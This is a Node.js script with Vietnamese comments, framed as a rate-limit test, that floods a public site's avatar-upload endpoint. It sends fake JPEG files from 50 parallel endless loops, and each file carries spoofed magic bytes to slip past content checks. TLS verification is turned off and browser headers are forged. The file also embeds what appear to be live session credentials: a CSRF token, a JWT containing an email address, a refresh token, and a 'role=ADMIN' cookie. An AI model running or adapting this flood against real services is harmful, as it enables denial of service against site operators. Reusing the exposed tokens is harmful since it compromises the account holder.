const axios = require('axios');
const https = require('https');
const FormData = require('form-data');

// ====== CẤU HÌNH TẤN CÔNG (chỉ chạy trên app CỦA BẠN / localhost) ======
const TARGET_URL = "https://nhaitienganh.vercel.app/api/v1/student/profile/avatar";

// Lấy từ curl của bạn:
const CSRF_TOKEN = "BZYVZkrxQuxZ2qDhOiy4T4I8pAdpDJzSagt9sa9C468";
// Browser tự gửi cookie, curl copy thường bỏ qua. Dán cookie session vào đây nếu endpoint cần auth:
const SESSION_COOKIE = "role=ADMIN; nta_csrf=BZYVZkrxQuxZ2qDhOiy4T4I8pAdpDJzSagt9sa9C468; role=STUDENT; nta_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJ1aWRpbmhxdW9jMjAwNUBnbWFpbC5jb20iLCJzdWIiOiIyOWYzMzk1Yi0xODdmLTRjMDktOTRhZS1hYTIzZDU3ZWM4NTMiLCJyb2xlIjoiU1RVREVOVCIsImlhdCI6MTc4MTI1MzY5MywiZXhwIjoxNzgxMjU1MTMzfQ.ZTqueY3hQYIAzKRYaxEh2rdrrBCRD634oWMeXfl5SZ4; nta_refresh=403045e4b4e853aa84148283b8ce218c337081332056331630b47ae3ba58f792"; // ví dụ: "access_token=xxx; refresh_token=yyy"

const CONCURRENCY = 50;        // Số luồng song song để test rate limit
const REQUEST_DELAY_MS = 10;   // Giãn cách giữa các request trong 1 luồng
const FILE_SIZE_MB = 5;        // "Bóp data": kích thước file giả gửi lên (MB)

// Bỏ qua lỗi cert self-signed của localhost https
const agent = new https.Agent({ rejectUnauthorized: false });

// Tạo buffer ảnh giả với header JPEG hợp lệ + nhồi data để test giới hạn size
function createFakeImage(sizeMb) {
    const size = sizeMb * 1024 * 1024;
    const buf = Buffer.alloc(size, 0x41); // nhồi 'A'
    // magic bytes JPEG để qua được content-type sniffing đơn giản
    buf[0] = 0xFF; buf[1] = 0xD8; buf[2] = 0xFF; buf[3] = 0xE0;
    return buf;
}

const fakeImage = createFakeImage(FILE_SIZE_MB);

async function attackWorker(id) {
    let count = 0;
    while (true) {
        count++;
        try {
            const form = new FormData();
            form.append('file', fakeImage, {
                filename: 'wallpaper.jpg',
                contentType: 'image/jpeg'
            });

            const res = await axios.post(TARGET_URL, form, {
                headers: {
                    ...form.getHeaders(),
                    'x-csrf-token': CSRF_TOKEN,
                    'Cookie': SESSION_COOKIE,
                    'Origin': 'https://nhaitienganh.vercel.app',
                    'Referer': 'https://nhaitienganh.vercel.app/profile',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
                    'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"'
                },
                httpsAgent: agent,
                maxBodyLength: Infinity,
                maxContentLength: Infinity,
                timeout: 15000
            });
            console.log(`[Worker ${id}][Req ${count}] Status: ${res.status}`);
        } catch (e) {
            if (e.response) {
                console.log(`[Worker ${id}][Req ${count}] Lỗi Server: ${e.response.status}`);
                if (e.response.status === 429) {
                    console.log("🛑 Dính Rate Limit (429)! Nghỉ 5s...");
                    await new Promise(r => setTimeout(r, 5000));
                }
                if (e.response.status === 413) {
                    console.log("📦 413 Payload Too Large - server có giới hạn size.");
                }
            } else {
                console.log(`[Worker ${id}] ${e.code || 'Timeout/Connection Reset'} (server có thể quá tải).`);
            }
        }
        await new Promise(r => setTimeout(r, REQUEST_DELAY_MS));
    }
}

console.log(`🚀 Test rate-limit + upload vào: ${TARGET_URL}`);
console.log(`Concurrency: ${CONCURRENCY} | File size: ${FILE_SIZE_MB}MB`);
if (!SESSION_COOKIE) {
    console.log("⚠️  SESSION_COOKIE trống — nếu endpoint cần đăng nhập sẽ trả 401. Dán cookie vào nếu cần.");
}

for (let i = 0; i < CONCURRENCY; i++) {
    attackWorker(i);
}
